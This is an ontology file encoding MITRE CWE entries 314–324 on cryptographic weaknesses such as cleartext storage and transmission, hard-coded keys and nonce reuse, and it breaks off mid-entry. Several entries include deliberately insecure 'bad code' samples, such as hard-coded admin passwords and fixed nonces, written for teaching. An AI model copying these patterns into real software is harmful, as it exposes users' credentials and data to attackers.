Individual: CWE-314_Cleartext_Storage_in_the_Registry

    Annotations: 
        rdfs:comment "Attackers can read the information by accessing the registry key. Even if the information is encoded in a way that is not human-readable, certain techniques could determine which encoding is being used, then decode the information."^^xsd:string,
        rdfs:comment "Terminology
Different people use \"cleartext\" and \"plaintext\" to mean the same thing: the lack of encryption. However, within cryptography, these have more precise meanings. Plaintext is the information just before it is fed into a cryptographic algorithm, including already-encrypted text. Cleartext is any information that is unencrypted, although it might be in an encoded form that is not easily human-readable (such as base64 encoding)."^^xsd:string,
        rdfs:comment "The application stores sensitive information in cleartext in the registry."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     
     Annotations: rdfs:comment "Cleartext passwords in registry key."^^xsd:string
                 
                 references  CVE-2005-2227,
     
     Annotations: rdfs:comment "Retrieve Embedded Sensitive Data"^^xsd:string
                 
                 related_attack_patterns  CAPEC-37,
     ID  "314"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-315_Cleartext_Storage_of_Sensitive_Information_in_a_Cookie

    Annotations: 
        rdfs:comment "Attackers can use widely-available tools to view the cookie and read the sensitive information. Even if the information is encoded in a way that is not human-readable, certain techniques could determine which encoding is being used, then decode the information."^^xsd:string,
        rdfs:comment "Terminology
Different people use \"cleartext\" and \"plaintext\" to mean the same thing: the lack of encryption. However, within cryptography, these have more precise meanings. Plaintext is the information just before it is fed into a cryptographic algorithm, including already-encrypted text. Cleartext is any information that is unencrypted, although it might be in an encoded form that is not easily human-readable (such as base64 encoding)."^^xsd:string,
        rdfs:comment "The application stores sensitive information in cleartext in a cookie."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     
     Annotations: rdfs:comment "Usernames/passwords in cleartext in cookies."^^xsd:string
                 
                 references  CVE-2001-1536,
     
     Annotations: rdfs:comment "Default configuration has cleartext usernames/passwords in cookie."^^xsd:string
                 
                 references  CVE-2001-1537,
     
     Annotations: rdfs:comment "Admin password in cleartext in a cookie."^^xsd:string
                 
                 references  CVE-2002-1800,
     
     Annotations: rdfs:comment "Authentication information stored in cleartext in a cookie."^^xsd:string
                 
                 references  CVE-2005-2160,
     
     Annotations: rdfs:comment "Accessing/Intercepting/Modifying HTTP Cookies"^^xsd:string
                 
                 related_attack_patterns  CAPEC-31,
     
     Annotations: rdfs:comment "Retrieve Embedded Sensitive Data"^^xsd:string
                 
                 related_attack_patterns  CAPEC-37,
     
     Annotations: rdfs:comment "Manipulating Opaque Client-based Data Tokens"^^xsd:string
                 
                 related_attack_patterns  CAPEC-39,
     
     Annotations: rdfs:comment "Manipulating User State"^^xsd:string
                 
                 related_attack_patterns  CAPEC-74,
     ID  "315"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
The following code excerpt stores a plaintext user account ID in a browser cookie.

(bad code)
Example Language: Java 
response.addCookie( new Cookie(\"userAccountID\", acctID);
Because the account ID is in plaintext, the user's account information is exposed if their computer is compromised by an attacker."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-316_Cleartext_Storage_of_Sensitive_Information_in_Memory

    Annotations: 
        rdfs:comment "Affected Resources:
Memory"^^xsd:string,
        rdfs:comment "Relationship:
This could be a resultant weakness, e.g. if the compiler removes code that was intended to wipe memory."^^xsd:string,
        rdfs:comment "Terminology:
Different people use \"cleartext\" and \"plaintext\" to mean the same thing: the lack of encryption. However, within cryptography, these have more precise meanings. Plaintext is the information just before it is fed into a cryptographic algorithm, including already-encrypted text. Cleartext is any information that is unencrypted, although it might be in an encoded form that is not easily human-readable (such as base64 encoding)."^^xsd:string,
        rdfs:comment "The application stores sensitive information in cleartext in memory."^^xsd:string,
        rdfs:comment "The sensitive memory might be saved to disk, stored in a core dump, or remain uncleared if the application crashes, or if the programmer does not properly clear the memory before freeing it.

It could be argued that such problems are usually only exploitable by those with administrator privileges. However, swapping could cause the memory to be written to disk and leave it accessible to physical attack afterwards. Core dump files might have insecure permissions or be stored in archive files that are accessible to untrusted people. Or, uncleared sensitive memory might be inadvertently exposed to attackers due to another weakness."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     
     Annotations: rdfs:comment "Password protector leaves passwords in memory when window is minimized, even when \"clear password when minimized\" is set."^^xsd:string
                 
                 references  CVE-2001-0984,
     
     Annotations: rdfs:comment "Sensitive authentication information in cleartext in memory."^^xsd:string
                 
                 references  CVE-2001-1517,
     
     Annotations: rdfs:comment "SSH client does not clear credentials from memory."^^xsd:string
                 
                 references  CVE-2003-0291,
     ID  "316"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Read Memory"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-317_Cleartext_Storage_of_Sensitive_Information_in_GUI

    Annotations: 
        rdfs:comment "An attacker can often obtain data from a GUI, even if hidden, by using an API to directly access GUI objects such as windows and menus. Even if the information is encoded in a way that is not human-readable, certain techniques could determine which encoding is being used, then decode the information."^^xsd:string,
        rdfs:comment "Terminology:
Different people use \"cleartext\" and \"plaintext\" to mean the same thing: the lack of encryption. However, within cryptography, these have more precise meanings. Plaintext is the information just before it is fed into a cryptographic algorithm, including already-encrypted text. Cleartext is any information that is unencrypted, although it might be in an encoded form that is not easily human-readable (such as base64 encoding)."^^xsd:string,
        rdfs:comment "The application stores sensitive information in cleartext within the GUI."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     
     Annotations: rdfs:comment "Unencrypted passwords stored in GUI dialog may allow local users to access the passwords."^^xsd:string
                 
                 references  CVE-2002-1848,
     ID  "317"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     confidentiality  "Read Memory"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Sometimes Prevalent"^^xsd:string
                 
                 operating_system  "Windows"^^xsd:string
    
    
Individual: CWE-318_Cleartext_Storage_of_Sensitive_Information_in_Executable

    Annotations: 
        rdfs:comment "Attackers can reverse engineer binary code to obtain secret data. This is especially easy when the cleartext is plain ASCII. Even if the information is encoded in a way that is not human-readable, certain techniques could determine which encoding is being used, then decode the information."^^xsd:string,
        rdfs:comment "Terminology:
Different people use \"cleartext\" and \"plaintext\" to mean the same thing: the lack of encryption. However, within cryptography, these have more precise meanings. Plaintext is the information just before it is fed into a cryptographic algorithm, including already-encrypted text. Cleartext is any information that is unencrypted, although it might be in an encoded form that is not easily human-readable (such as base64 encoding)."^^xsd:string,
        rdfs:comment "The application stores sensitive information in cleartext in an executable."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     
     Annotations: rdfs:comment "administration passwords in cleartext in executable"^^xsd:string
                 
                 references  CVE-2001-1527,
     
     Annotations: rdfs:comment "Product stores RSA private key in a DLL and uses it to sign a certificate, allowing spoofing of servers and MITM attacks."^^xsd:string
                 
                 references  CVE-2005-1794,
     
     Annotations: rdfs:comment "Retrieve Embedded Sensitive Data"^^xsd:string
                 
                 related_attack_patterns  CAPEC-37,
     
     Annotations: rdfs:comment "Sniff Application Code"^^xsd:string
                 
                 related_attack_patterns  CAPEC-65,
     ID  "318"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-319_Cleartext_Transmission_of_Sensitive_Information

    Annotations: 
        rdfs:comment "Many communication channels can be \"sniffed\" by attackers during data transmission. For example, network traffic can often be sniffed by any attacker who has access to a network interface. This significantly lowers the difficulty of exploitation by attackers."^^xsd:string,
        rdfs:comment "The software transmits sensitive or security-critical data in cleartext in a communication channel that can be sniffed by unauthorized actors."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     
     Annotations: rdfs:comment "Passwords transmitted in cleartext."^^xsd:string
                 
                 references  CVE-2002-1949,
     
     Annotations: rdfs:comment "Product transmits Blowfish encryption key in cleartext."^^xsd:string
                 
                 references  CVE-2004-1852,
     
     Annotations: rdfs:comment "Product sends file with cleartext passwords in e-mail message intended for diagnostic purposes."^^xsd:string
                 
                 references  CVE-2005-3140,
     
     Annotations: rdfs:comment "Product sends passwords in cleartext to a log server."^^xsd:string
                 
                 references  CVE-2007-4786,
     
     Annotations: rdfs:comment "Chain: cleartext transmission of the MD5 hash of password enables attacks against a server that is susceptible to replay (CWE-294)."^^xsd:string
                 
                 references  CVE-2007-4961,
     
     Annotations: rdfs:comment "Backup routine sends password in cleartext in email."^^xsd:string
                 
                 references  CVE-2007-5626,
     
     Annotations: rdfs:comment "Printer sends configuration information, including administrative password, in cleartext."^^xsd:string
                 
                 references  CVE-2008-0374,
     
     Annotations: rdfs:comment "Product sends password hash in cleartext in violation of intended policy."^^xsd:string
                 
                 references  CVE-2008-3289,
     
     Annotations: rdfs:comment "Chain: Use of HTTPS cookie without \"secure\" flag causes it to be transmitted across unencrypted HTTP."^^xsd:string
                 
                 references  CVE-2008-4122,
     
     Annotations: rdfs:comment "Remote management feature sends sensitive information including passwords in cleartext."^^xsd:string
                 
                 references  CVE-2008-4390,
     
     Annotations: rdfs:comment "Session Sidejacking"^^xsd:string
                 
                 related_attack_patterns  CAPEC-102,
     
     Annotations: rdfs:comment "Harvesting Information via API Event Monitoring"^^xsd:string
                 
                 related_attack_patterns  CAPEC-383,
     
     Annotations: rdfs:comment "Signature Spoofing by Mixing Signed and Unsigned Content"^^xsd:string
                 
                 related_attack_patterns  CAPEC-477,
     
     Annotations: rdfs:comment "Sniff Application Code"^^xsd:string
                 
                 related_attack_patterns  CAPEC-65,
     
     Annotations: rdfs:comment "Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.
Attach the monitor to the process, trigger the feature that sends the data, and look for the presence or absence of common cryptographic functions in the call tree. Monitor the network and determine if the data packets contain readable commands. Tools exist for detecting if certain encodings are in use. If the traffic contains high entropy, this might indicate the usage of encryption."^^xsd:string
                 
                 Black_Box  ""^^xsd:string,
     ID  "319"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Encrypt the data with a reliable encryption scheme before transmitting."^^xsd:string, 
                 rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Modify Files or Directories"^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
The following code attempts to establish a connection to a site to communicate sensitive information.

(bad code)
Example Language: Java 
try {
URL u = new URL(\"http://www.secret.example.org/\");
HttpURLConnection hu = (HttpURLConnection) u.openConnection();
hu.setRequestMethod(\"PUT\");
hu.connect();
OutputStream os = hu.getOutputStream();
hu.disconnect();
}
catch (IOException e) {

//... 
}
Though a connection is successfully made, the connection is unencrypted and it is possible that all sensitive data sent to or received from the server will be read by unintended actors."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "When using web applications with SSL, use SSL for the entire session from login to logout, not just for the initial login page."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Modify Files or Directories"^^xsd:string,
     integrity  "Read Application Data"^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Configure servers to use encrypted channels for communication, which may include SSL or other secure protocols."^^xsd:string
                 
                 operation  ""^^xsd:string,
     paradigms  "Mobile"^^xsd:string,
     system_configuration  ""^^xsd:string,
     
     Annotations: rdfs:comment "Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules."^^xsd:string
                 
                 testing  ""^^xsd:string
    
    
Individual: CWE-321_Use_of_Hard-coded_Cryptographic_Key

    Annotations: 
        rdfs:comment "Other:
The main difference between the use of hard-coded passwords and the use of hard-coded cryptographic keys is the false sense of security that the former conveys. Many people believe that simply hashing a hard-coded password before storage will protect the information from malicious users. However, many hashes are reversible (or at least vulnerable to brute force attacks) -- and further, many authentication protocols simply request the hash itself, making it no better than a password."^^xsd:string,
        rdfs:comment "The use of a hard-coded cryptographic key significantly increases the possibility that encrypted data may be recovered."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     ID  "321"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "If hard-coded cryptographic keys are used, it is almost certain that malicious users will gain access through the account in question."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "If hard-coded cryptographic keys are used, it is almost certain that malicious users will gain access through the account in question."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Prevention schemes mirror that of hard-coded password storage."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1

The following code examples attempt to verify a password using a hard-coded cryptographic key.

(bad code)
Example Language: C 
int VerifyAdmin(char *password) {
if (strcmp(password,\"68af404b513073584c4b6f22b6c63e6b\")) {

printf(\"Incorrect Password!\\n\");
return(0);
}
printf(\"Entering Diagnostic Mode...\\n\");
return(1);
}
(bad code)
Example Language: Java 
public boolean VerifyAdmin(String password) {
if (password.equals(\"68af404b513073584c4b6f22b6c63e6b\")) {
System.out.println(\"Entering Diagnostic Mode...\");
return true;
}
System.out.println(\"Incorrect Password!\");
return false;
(bad code)
Example Language: C# 
int VerifyAdmin(String password) {
if (password.Equals(\"68af404b513073584c4b6f22b6c63e6b\")) {
Console.WriteLine(\"Entering Diagnostic Mode...\");
return(1);
}
Console.WriteLine(\"Incorrect Password!\");
return(0);
}
The cryptographic key is within a hard-coded string value that is compared to the password. It is likely that an attacker will be able to read the key and compromise the system."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-322_Key_Exchange_without_Entity_Authentication

    Annotations: 
        rdfs:comment "Performing a key exchange will preserve the integrity of the information sent between two entities, but this will not guarantee that the entities are who they claim they are. This may enable a set of \"man-in-the-middle\" attacks. Typically, this involves a victim client that contacts a malicious server that is impersonating a trusted server. If the client skips authentication or ignores an authentication failure, the malicious server may request authentication information from the user. The malicious server can then use this authentication information to log in to the trusted server using the victim's credentials, sniff traffic between the victim and trusted server, etc."^^xsd:string,
        rdfs:comment "The software performs a key exchange with an actor without verifying the identity of that actor."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1010_Authenticate_Actors,
     ID  "322"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "No authentication takes place in this process, bypassing an assumed protection of encryption."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Ensure that proper authentication is included in the system design."^^xsd:string, 
                 rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "The encrypted communication between a user and a trusted host may be subject to a \"man-in-the-middle\" sniffing attack."^^xsd:string
                 
                 confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Many systems have used Diffie-Hellman key exchange without authenticating the entities exchanging keys, leading to man-in-the-middle attacks. Many people using SSL/TLS skip the authentication (often unknowingly)."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Understand and properly implement all checks necessary to ensure the identity of entities involved in encrypted communications."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-323_Reusing_a_Nonce_Key_Pair_in_Encryption

    Annotations: 
        rdfs:comment "Background Details:
Nonces are often bundled with a key in a communication exchange to produce a new session key for each exchange."^^xsd:string,
        rdfs:comment "Nonces should be used for the present occasion and only once."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     ID  "323"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "Potentially a replay attack, in which an attacker could send the same data twice, could be crafted if nonces are allowed to be reused. This could allow a user to send a message which masquerades as a valid message from a valid user."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "Potentially a replay attack, in which an attacker could send the same data twice, could be crafted if nonces are allowed to be reused. This could allow a user to send a message which masquerades as a valid message from a valid user."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1.
This code takes a password, concatenates it with a nonce, then encrypts it before sending over a network:

(bad code)
Example Language: C 
void encryptAndSendPassword(char *password){
char *nonce = \"bad\";
...
char *data = (unsigned char*)malloc(20);
int para_size = strlen(nonce) + strlen(password);
char *paragraph = (char*)malloc(para_size);
SHA1((const unsigned char*)paragraph,parsize,(unsigned char*)data);
sendEncryptedData(data)
}
Because the nonce used is always the same, an attacker can impersonate a trusted party by intercepting and resending the encrypted password. This attack avoids the need to learn the unencrypted password."^^xsd:string, 
                 rdfs:comment "Example 2
This code sends a command to a remote server, using an encrypted password and nonce to prove the command is from a trusted party:

(bad code)
Example Language: C++ 
String command = new String(\"some command to execute\");
MessageDigest nonce = MessageDigest.getInstance(\"SHA\");
nonce.update(String.valueOf(\"bad nonce\"));
byte[] nonce = nonce.digest();
MessageDigest password = MessageDigest.getInstance(\"SHA\");
password.update(nonce + \"secretPassword\");
byte[] digest = password.digest();
sendCommand(digest, command)
Once again the nonce used is always the same. An attacker may be able to replay previous legitimate commands or execute new arbitrary commands."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Refuse to reuse nonce values."^^xsd:string, 
                 rdfs:comment "Use techniques such as requiring incrementing, time based and/or challenge response to assure uniqueness of nonces."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-324_Use_of_a_Key_Past_its_Expiration_Date

    Annotations: 
        rdfs:comment "The product uses a cryptographic key or password past its expiration date, which diminishes its safety significantly by increasing the timing window for cracking attacks against that key."^^xsd:string,
        rdfs:comment "While the expiration of keys does not necessarily ensure that they are compromised, it is a significant concern that keys which remain in use for prolonged periods of time have a decreasing probability of integrity. For this reason, it is important to replace keys within a period of time proportional to their strength."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     ID  "324"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The cryptographic key in question may be compromised, providing a malicious user with a method for authenticating as the victim."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "The cryptographic key in question may be compromised, providing a malicious user with a method for authenticating as the victim."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Adequate consideration should be put in to the user interface in order to notify users previous to the key's expiration, to explain the importance of new key generation and to walk users through the process as painlessly as possible."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "The following code attempts to verify that a certificate is valid.

